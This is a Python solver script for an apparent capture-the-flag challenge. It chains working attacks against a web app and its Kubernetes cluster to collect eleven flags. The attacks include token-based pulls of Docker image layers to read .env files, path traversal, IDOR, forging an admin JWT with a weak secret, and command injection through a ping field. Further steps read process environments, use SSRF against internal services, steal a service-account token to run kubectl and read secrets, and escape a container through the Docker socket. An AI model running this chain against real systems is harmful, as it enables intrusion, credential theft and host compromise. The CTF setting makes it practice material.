# pip install requests PyJWT
import warnings, requests, tarfile, io, re, jwt, base64, json, time
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

BASE="https://ctf.seoeh.ir"; REG="https://hub.hamdocker.ir"
REPO="seoeh/hamamooz_challlenges"; F={}

# F1: Docker Registry - layer blob → .env
tk=requests.get(f"{REG}/artifactory/api/docker/hub/v2/token",
  params={"service":"hub.hamdocker.ir","scope":f"repository:{REPO}:pull"}).json()["token"]
hd={"Authorization":f"Bearer {tk}","Accept":"application/vnd.docker.distribution.manifest.v2+json"}
mf=requests.get(f"{REG}/v2/{REPO}/manifests/backend",headers=hd,timeout=30).json()
for L in mf["layers"]:
    if L["size"]>10_000_000: continue
    r=requests.get(f"{REG}/v2/{REPO}/blobs/{L['digest']}",headers=hd,timeout=30)
    if r.status_code!=200: continue
    try:
        with tarfile.open(fileobj=io.BytesIO(r.content),mode="r:gz") as t:
            for m in t.getmembers():
                if ".env" in m.name and m.isfile():
                    x=re.search(r'HAMAMOOZ\{[^}]+\}',t.extractfile(m).read().decode(errors="ignore"))
                    if x: F["F1"]=x.group(0); break
    except: pass
    if "F1" in F: break

# F2: Swagger info disclosure
x=re.search(r'HAMAMOOZ\{[^}]+\}',requests.get(f"{BASE}/swagger.json",verify=False,timeout=20).text)
if x: F["F2"]=x.group(0)

# F3: Internal endpoint + debug header bypass
r=requests.get(f"{BASE}/api/internal/flag",headers={"X-Debug-Mode":"true"},verify=False,timeout=20)
if r.status_code==200: F["F3"]=r.json().get("flag")

# F4: Path traversal
x=re.search(r'HAMAMOOZ\{[^}]+\}',
  requests.get(f"{BASE}/api/reports/download",params={"file":"../../../app/flag.txt"},verify=False,timeout=20).text)
if x: F["F4"]=x.group(0)

# Token
requests.post(f"{BASE}/auth/register",json={"username":"sv","password":"Sv123!"},verify=False,timeout=20)
TK=requests.post(f"{BASE}/auth/login",json={"username":"sv","password":"Sv123!"},verify=False,timeout=20).json()["token"]

# F5: IDOR
for o in range(1,6):
    for p in range(1,6):
        r=requests.get(f"{BASE}/api/orgs/{o}/reports/{p}",headers={"Authorization":f"Bearer {TK}"},verify=False,timeout=10)
        if r.status_code==200:
            x=re.search(r'HAMAMOOZ\{[^}]+\}',r.text)
            if x: F["F5"]=x.group(0); break
    if "F5" in F: break

# F6: Weak JWT secret
fg=jwt.encode({"sub":"999","username":"admin","org":"Acme Corp","role":"admin"},"changeme123",algorithm="HS256")
r=requests.get(f"{BASE}/admin/dashboard",headers={"Authorization":f"Bearer {fg}"},verify=False,timeout=20)
if r.status_code==200: F["F6"]=r.json().get("flag")

def rce(cmd):
    r=requests.post(f"{BASE}/api/diag/ping",
      headers={"Authorization":f"Bearer {TK}","Content-Type":"application/json"},
      json={"host":f"127.0.0.1; {cmd}"},verify=False,timeout=30)
    try: return r.json().get("output","")
    except: return ""

# F9: Command injection → env
x=re.search(r'FLAG_F9=(HAMAMOOZ\{[^}]+\})',rce("cat /proc/1/environ|tr '\\0' '\\n'|grep FLAG_F9"))
if x: F["F9"]=x.group(1)

# F10: SSRF
x=re.search(r'HAMAMOOZ\{[^}]+\}',
  requests.post(f"{BASE}/api/webhooks/test",headers={"Content-Type":"application/json"},
    json={"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET"},
    verify=False,timeout=20).text)
if x: F["F10"]=x.group(0)

def kc(a):
    return rce(f'kubectl --server=https://kubernetes.default.svc '
      f'--token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) '
      f'--certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt {a}')

# F7: RCE → kubectl → K8s secret
x=re.search(r'([A-Za-z0-9+/=]{20,})',kc("get secret flag-secret -n ctf-secrets -o jsonpath='{.data.flag}'"))
if x:
    try: F["F7"]=base64.b64decode(x.group(1)).decode()
    except: pass

# F8: RCE → kubectl exec → privileged pod hostPath
x=re.search(r'HAMAMOOZ\{[^}]+\}',
  kc("exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"))
if x: F["F8"]=x.group(0)

# F11: RCE → kubectl exec → docker socket → container escape
p=base64.b64encode(json.dumps({"Image":"hub.hamdocker.ir/alpine:3.19","Cmd":["cat","/realhost/home/ubuntu/flag.txt"],"HostConfig":{"Binds":["/:/realhost:ro"]}}).encode()).decode()
out=kc(f"exec -n escape-zone legacy-worker -- /bin/sh -c 'echo {p} | base64 -d | curl -s --unix-socket /host/run/docker.sock -X POST -H \"Content-Type: application/json\" -d @- http://localhost/containers/create'")
m=re.search(r'"Id":"([a-f0-9]+)"',out)
if m:
    kc(f"exec -n escape-zone legacy-worker -- /bin/sh -c 'curl -s --unix-socket /host/run/docker.sock -X POST http://localhost/containers/{m.group(1)}/start'")
    time.sleep(2)
    logs=kc(f"exec -n escape-zone legacy-worker -- /bin/sh -c 'curl -s --unix-socket /host/run/docker.sock \"http://localhost/containers/{m.group(1)}/logs?stdout=true&stderr=true\"'")
    x=re.search(r'HAMAMOOZ\{[^}]+\}',logs)
    if x: F["F11"]=x.group(0)

for i in range(1,12): print(f"F{i}: {F.get(f'F{i}','[NOT FOUND]')}")